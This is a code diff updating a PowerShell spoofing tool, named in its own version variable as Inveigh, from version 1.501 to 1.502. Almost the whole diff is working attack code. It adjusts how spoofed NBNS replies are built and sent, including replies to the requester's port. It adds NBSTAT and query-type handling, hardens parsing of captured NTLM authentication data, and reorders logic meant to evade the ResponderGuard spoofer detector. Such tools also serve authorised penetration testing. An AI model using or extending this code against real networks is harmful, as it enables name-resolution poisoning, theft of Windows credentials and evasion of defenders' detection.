@@ -500,7 +500,7 @@ if($invalid_parameter)
     throw
 }
 
-$inveigh_version = "1.501"
+$inveigh_version = "1.502"
 
 if(!$IP)
 { 
@@ -1699,7 +1699,7 @@ $shared_basic_functions_scriptblock =
 
     function Get-SpooferResponseMessage
     {
-        param ([String]$QueryString,[String]$Type,[String]$mDNSType,[String]$Enabled)
+        param ([String]$QueryString,[String]$Type,[String]$mDNSType,[String]$Enabled,[byte]$NBNSType)
 
         if($QueryString -like "*.*")
         {
@@ -1749,18 +1749,18 @@ $shared_basic_functions_scriptblock =
         {
             $response_message = ": " + [Int]($SpooferLearningDelay - $spoofer_learning_stopwatch.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
         }
-        elseif($EvadeRG -eq 'Y' -and $Type -ne 'mDNS' -and $Type -ne 'DNS' -and $destination_IP.IPAddressToString -eq $IP)
-        {
-            $response_message = "[possible ResponderGuard request ignored]"
-            $response_type = "[!]"
-        }
         elseif($Type -eq 'NBNS' -and $NBNSTypes -notcontains $NBNS_query_type)
         {
             $response_message = "[NBNS type disabled]"
         }
-        elseif($Type -eq 'NBNS' -and $QueryString.Trim() -eq '*')
+        elseif($Type -eq 'NBNS' -and $NBNSType -eq 33)
         {
             $response_message = "[NBSTAT request]"
+        }
+        elseif($EvadeRG -eq 'Y' -and $Type -ne 'mDNS' -and $Type -ne 'DNS' -and $destination_IP.IPAddressToString -eq $IP)
+        {
+            $response_message = "[possible ResponderGuard request ignored]"
+            $response_type = "[!]"
         }
         elseif($Type -eq 'mDNS' -and $mDNSType -and $mDNSTypes -notcontains $mDNSType)
         {
@@ -1795,6 +1795,16 @@ $shared_basic_functions_scriptblock =
             '41-41'
             {
                 $NBNS_query_type = "00"
+            }
+
+            '41-42'
+            {
+                $NBNS_query_type = "01"
+            }
+
+            '41-43'
+            {
+                $NBNS_query_type = "02"
             }
 
             '41-44'
@@ -2001,7 +2011,12 @@ $NTLM_functions_scriptblock =
             $NTLM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""
             $domain_length = Get-UInt16DataLength ($NTLMSSP_offset + 28) $Payload
             $domain_offset = Get-UInt32DataLength ($NTLMSSP_offset + 32) $Payload
-            $NTLM_domain_string = Convert-DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $Payload
+
+            if($domain_length -gt 0)
+            {
+                $NTLM_domain_string = Convert-DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $Payload
+            }
+
             $user_length = Get-UInt16DataLength ($NTLMSSP_offset + 36) $Payload
             $user_offset = Get-UInt32DataLength ($NTLMSSP_offset + 40) $Payload
             $NTLM_user_string = Convert-DataToString ($NTLMSSP_offset + $user_offset) $user_length $Payload
@@ -4280,8 +4295,8 @@ $sniffer_scriptblock =
                 $binary_reader.ReadBytes(8) > $null
                 $TCP_header_length = [Int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                 $TCP_flags = $binary_reader.ReadByte()
-                $binary_reader.ReadBytes(6) > $null
-                $payload_bytes = $binary_reader.ReadBytes($packet_length - ($header_length + $TCP_header_length))
+                $binary_reader.ReadBytes($TCP_header_length - 14) > $null
+                $payload_bytes = $binary_reader.ReadBytes($packet_length)
                 $TCP_flags = ([convert]::ToString($TCP_flags,2)).PadLeft(8,"0")
 
                 if($TCP_flags.SubString(6,1) -eq "1" -and $TCP_flags.SubString(3,1) -eq "0" -and $destination_IP -eq $IP)
@@ -4541,11 +4556,13 @@ $sniffer_scriptblock =
                     
                                 $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])
                                 $NBNS_query_type = Get-NBNSQueryType $NBNS_query_type
+                                $NBNS_type = $payload_bytes[47]
                                 $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.Length - 4)])
                                 $NBNS_query = $NBNS_query -replace "-00",""
                                 $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                 $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
-                                $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
+                                $NBNS_query_string_encoded_check = $NBNS_query_string_encoded
+                                $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))                
                                 $NBNS_query_string_subtracted = $null
                                 $NBNS_query_string = $null
                                 $n = 0
@@ -4566,6 +4583,13 @@ $sniffer_scriptblock =
                                     $n += 2
                                 }
                                 until($n -ge ($NBNS_query_string_subtracted.Length) -or $NBNS_query_string.Length -eq 15)
+
+                                if($NBNS_query_string_encoded_check.StartsWith("ABAC") -and $NBNS_query_string_encoded_check.EndsWith("ACAB"))
+                                {
+                                    $NBNS_query_string = $NBNS_query_string.Substring(2)
+                                    $NBNS_query_string = $NBNS_query_string.Substring(0, $NBNS_query_string.Length - 1)
+                                    $NBNS_query_string = "<01><02>" + $NBNS_query_string + "<02>"
+                                }
 
                                 if($NBNS_query_string -notmatch '[^\x00-\x7F]+')
                                 {
@@ -4632,7 +4656,7 @@ $sniffer_scriptblock =
 
                             }
 
-                            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS" -Enabled $NBNS
+                            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS" -Enabled $NBNS -NBNSType $NBNS_type
                             $NBNS_response_type = $NBNS_response_message[0]
                             $NBNS_response_message = $NBNS_response_message[1]
 
@@ -5349,11 +5373,13 @@ $NBNS_spoofer_scriptblock =
             $source_IP = $NBNS_listener_endpoint.Address
             $NBNS_query_type = [System.BitConverter]::ToString($NBNS_request_data[43..44])
             $NBNS_query_type = Get-NBNSQueryType $NBNS_query_type
+            $NBNS_type = $NBNS_request_data[47]
             $NBNS_response_type = "[+]"
             $NBNS_query = [System.BitConverter]::ToString($NBNS_request_data[13..($NBNS_request_data.Length - 4)])
             $NBNS_query = $NBNS_query -replace "-00",""
             $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
             $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
+            $NBNS_query_string_encoded_check = $NBNS_query_string_encoded
             $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
             $NBNS_query_string_subtracted = $null
             $NBNS_query_string = $null
@@ -5376,6 +5402,13 @@ $NBNS_spoofer_scriptblock =
             }
             until($n -ge ($NBNS_query_string_subtracted.Length) -or $NBNS_query_string.Length -eq 15)
 
+            if($NBNS_query_string_encoded_check.StartsWith("ABAC") -and $NBNS_query_string_encoded_check.EndsWith("ACAB"))
+            {
+                $NBNS_query_string = $NBNS_query_string.Substring(2)
+                $NBNS_query_string = $NBNS_query_string.Substring(0, $NBNS_query_string.Length - 1)
+                $NBNS_query_string = "<01><02>" + $NBNS_query_string + "<02>"
+            }
+
             if($NBNS_query_string -notmatch '[^\x00-\x7F]+')
             {
 
@@ -5392,13 +5425,13 @@ $NBNS_spoofer_scriptblock =
 
             }
             
-            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS" -Enabled $NBNS
+            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS" -Enabled $NBNS -NBNSType $NBNS_type
             $NBNS_response_type = $NBNS_response_message[0]
             $NBNS_response_message = $NBNS_response_message[1]
 
             if($NBNS_response_message -eq '[response sent]')
             {
-                $NBNS_destination_endpoint = New-Object System.Net.IPEndpoint($NBNS_listener_endpoint.Address,137)
+                $NBNS_destination_endpoint = New-Object System.Net.IPEndpoint($NBNS_listener_endpoint.Address,$NBNS_listener_endpoint.Port)
                 $NBNS_UDP_client.Connect($NBNS_destination_endpoint)
                 $NBNS_UDP_client.Send($NBNS_response_packet,$NBNS_response_packet.Length)
                 $NBNS_UDP_client.Close()
